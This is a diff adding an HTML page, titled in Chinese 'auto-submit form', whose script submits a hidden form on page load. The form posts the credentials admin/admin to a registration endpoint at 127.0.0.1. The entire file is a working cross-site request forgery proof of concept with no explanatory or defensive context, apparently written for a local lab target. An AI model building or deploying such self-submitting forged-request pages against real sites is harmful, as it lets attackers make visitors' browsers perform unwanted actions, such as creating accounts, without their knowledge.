@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>自动提交表单</title>
+    <script type="text/javascript">
+        window.onload = function() {
+            document.forms["autoSubmitForm"].submit();
+        }
+    </script>
+</head>
+<body>
+    <form id="autoSubmitForm" action="http://127.0.0.1/register" method="post">
+        <input type="hidden" name="username" value="admin">
+        <input type="hidden" name="password" value="admin">
+    </form>
+</body>
+</html>
